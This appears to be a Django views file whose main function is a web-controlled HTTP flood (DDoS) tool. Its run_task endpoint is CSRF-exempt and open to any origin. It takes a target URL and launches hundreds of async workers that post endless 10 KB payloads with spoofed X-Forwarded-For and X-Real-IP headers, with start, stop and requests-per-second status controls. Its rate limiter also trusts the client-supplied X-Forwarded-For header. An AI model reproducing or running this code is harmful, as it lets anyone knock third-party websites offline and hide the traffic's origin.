import json
import random
import asyncio
import aiohttp
import threading
import requests
import time
from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.core.cache import cache

def menu(request):
    ip = get_client_ip(request)
    if is_rate_limited(ip, 'menu'):
        return JsonResponse({"error": "Too many requests"}, status=429)
    return render(request, 'vulnerabilities/menu.html')

def start(request):
    ip = get_client_ip(request)
    if is_rate_limited(ip, 'start'):
        return JsonResponse({"error": "Too many requests"}, status=429)
    return render(request, 'vulnerabilities/start.html')

def custom_404(request, exception=None, *args, **kwargs):
    return render(request, 'vulnerabilities/404.html', status=404)

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

def is_rate_limited(ip, page, limit=30, period=60):
    key = f'ratelimit_{page}_{ip}'
    count = cache.get(key, 0)
    if count >= limit:
        return True
    cache.set(key, count + 1, period)
    return False

_ddos_running = False
_ddos_total = 0
_ddos_last_fake_ip = "0.0.0.0"
_ddos_last_status = "N/A"
_ddos_tasks = []
_ddos_monitor_task = None
_ddos_thread = None
_ddos_loop = None
_ddos_last_time = 0
_ddos_last_count = 0

async def _worker(worker_id, target):
    global _ddos_total, _ddos_last_fake_ip, _ddos_last_status
    data = b'A' * (1024 * 10)
    connector = aiohttp.TCPConnector(
        limit=0, limit_per_host=0, force_close=True,
        enable_cleanup_closed=True, ttl_dns_cache=0,
        use_dns_cache=False, ssl=False
    )
    session = aiohttp.ClientSession(connector=connector)
    try:
        while _ddos_running:
            try:
                fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                headers = {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Language": "az-AZ,az;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Forwarded-For": fake_ip,
                    "X-Real-IP": fake_ip,
                    "Origin": "https://example.com",
                    "Referer": "https://example.com/",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache"
                }
                async with session.post(target, data=data, headers=headers, timeout=10) as resp:
                    await resp.read()
                    _ddos_last_status = resp.status
                _ddos_total += 1
                _ddos_last_fake_ip = fake_ip
            except Exception:
                _ddos_total += 1
                _ddos_last_fake_ip = fake_ip
                _ddos_last_status = "FALSE"
            await asyncio.sleep(0)
    finally:
        await session.close()

async def _monitor():
    while _ddos_running:
        await asyncio.sleep(1)

def _run_attack(target, workers):
    global _ddos_running, _ddos_tasks, _ddos_monitor_task, _ddos_loop
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    _ddos_loop = loop
    try:
        for i in range(workers):
            task = loop.create_task(_worker(i, target))
            _ddos_tasks.append(task)
        _ddos_monitor_task = loop.create_task(_monitor())
        loop.run_forever()
    finally:
        loop.close()

@csrf_exempt
def run_task(request):
    if request.method == 'GET':
        return JsonResponse({"response": "Send POST with action: start, stop, status, check"}, status=304)

    if request.method == 'OPTIONS':
        response = JsonResponse({})
        response['Access-Control-Allow-Origin'] = '*'
        response['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        response['Access-Control-Allow-Headers'] = 'Content-Type'
        return response

    if request.method != 'POST':
        return JsonResponse({"response": "ERROR | Only POST allowed"})

    try:
        body = json.loads(request.body)
        action = body.get("action")
    except:
        return JsonResponse({"response": "ERROR | Invalid JSON"})

    if action == "check":
        target = body.get("target")
        if not target:
            return JsonResponse({"response": "ERROR | Missing target URL"})
        try:
            r = requests.head(target, timeout=5, allow_redirects=True)
            if r.status_code < 400:
                return JsonResponse({"response": "OK | Site reachable"})
            else:
                return JsonResponse({"response": f"ERROR | Site returned {r.status_code}"})
        except Exception:
            return JsonResponse({"response": "ERROR | Site does not exist or unreachable"})

    elif action == "start":
        global _ddos_running, _ddos_total, _ddos_last_fake_ip, _ddos_last_status, _ddos_thread, _ddos_last_time, _ddos_last_count
        if _ddos_running:
            return JsonResponse({"response": "ERROR | Attack already running"})
        target = body.get("target")
        workers = body.get("workers", 500)
        if not target:
            return JsonResponse({"response": "ERROR | Missing target URL"})
        _ddos_running = True
        _ddos_total = 0
        _ddos_last_fake_ip = "0.0.0.0"
        _ddos_last_status = "N/A"
        _ddos_last_time = time.time()
        _ddos_last_count = 0
        _ddos_thread = threading.Thread(target=_run_attack, args=(target, workers), daemon=True)
        _ddos_thread.start()
        return JsonResponse({"response": f"OK | Attack started on {target} with {workers} workers"})

    elif action == "stop":
        global _ddos_loop, _ddos_tasks, _ddos_monitor_task
        if not _ddos_running:
            return JsonResponse({"response": "ERROR | No attack running"})
        _ddos_running = False
        if _ddos_loop and _ddos_loop.is_running():
            for task in _ddos_tasks:
                if not task.done():
                    _ddos_loop.call_soon_threadsafe(task.cancel)
            if _ddos_monitor_task and not _ddos_monitor_task.done():
                _ddos_loop.call_soon_threadsafe(_ddos_monitor_task.cancel)
        _ddos_tasks.clear()
        _ddos_monitor_task = None
        if _ddos_thread and _ddos_thread.is_alive():
            _ddos_thread.join(timeout=1)
        _ddos_thread = None
        _ddos_loop = None
        return JsonResponse({"response": f"OK | Stopped | Total: {_ddos_total}"})

    elif action == "status":
        if not _ddos_running:
            return JsonResponse({"response": "ERROR | No attack running"})
        if _ddos_total == 0:
            return JsonResponse({"response": ""})
        current_time = time.time()
        elapsed = current_time - _ddos_last_time
        if elapsed > 0:
            rps = (_ddos_total - _ddos_last_count) / elapsed
        else:
            rps = 0
        _ddos_last_time = current_time
        _ddos_last_count = _ddos_total
        if _ddos_last_status == "FALSE":
            prefix = "FALSE"
        else:
            prefix = "OK"
        return JsonResponse({
            "response": f"{prefix} | {_ddos_last_fake_ip} | {_ddos_total} | {_ddos_last_status} | RPS: {int(rps)}"
        })

    else:
        return JsonResponse({"response": "ERROR | Unknown action"})